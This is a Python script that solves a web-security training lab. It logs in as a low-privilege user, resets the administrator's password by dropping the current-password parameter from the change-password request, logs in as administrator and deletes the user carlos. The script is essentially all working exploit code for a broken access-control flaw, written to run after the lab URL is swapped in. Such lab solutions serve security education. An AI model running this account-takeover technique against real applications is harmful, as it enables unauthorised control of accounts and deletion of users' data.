#################################################################################
#
# Lab: Weak isolation on dual-use endpoint
#
# Hack Steps: 
#      1. Fetch the login page
#      2. Extract the csrf token and session cookie to login
#      3. Login as wiener
#      4. Fetch wiener's profle
#      5. Extract the csrf token needed for changing password
#      6. Change the administrato's password by removing the current-password 
#         parameter from the request to skip the validation
#      7. Fetch the login page
#      8. Extract the csrf token and session cookie to login
#      9. Login as administrator
#      10. Delete carlos from the admin panel
#
#################################################################################
import requests
import re
from colorama import Fore

LAB_URL = "https://0a51004c03ff7d2080247608005000a5.web-security-academy.net" # Change this to your lab URL
NEW_ADMIN_PASSWORD = "hacked" # You can change this to what you want

def main():
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
    
    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie to login.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    login_as_wiener = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Fetching wiener's profile.. ", end="", flush=True)

    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }
    wiener_profile = fetch("/my-account", cookies)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Extracting the csrf token needed for changing password.. ", end="", flush=True)

    csrf = re.findall("csrf.+value=\"(.+)\"", wiener_profile.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Changing the administrator's password to " + Fore.YELLOW + NEW_ADMIN_PASSWORD + Fore.WHITE + ".. ", end="", flush=True)

    data = { "username": "administrator", "new-password-1": NEW_ADMIN_PASSWORD, "new-password-2": NEW_ADMIN_PASSWORD, "csrf": csrf }
    post_data("/my-account/change-password", data, cookies=cookies)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗7⦘ Fetching the login page.. ", end="", flush=True)
    
    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗8⦘ Extracting the csrf token and session cookie to login.. ", end="", flush=True)
  
    session = login_page.cookies.get("session")
    csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗9⦘ Logging in as administrator.. ", end="", flush=True)

    cookies = { "session": session }
    data = { "username": "administrator", "password": NEW_ADMIN_PASSWORD, "csrf": csrf }
    login_as_admin = post_data("/login", data, cookies)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗10⦘ Deleting carlos.. ", end="", flush=True)

    session = login_as_admin.cookies.get("session")
    cookies = { "session": session }
    fetch("/admin/delete?username=carlos", cookies)
        
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()
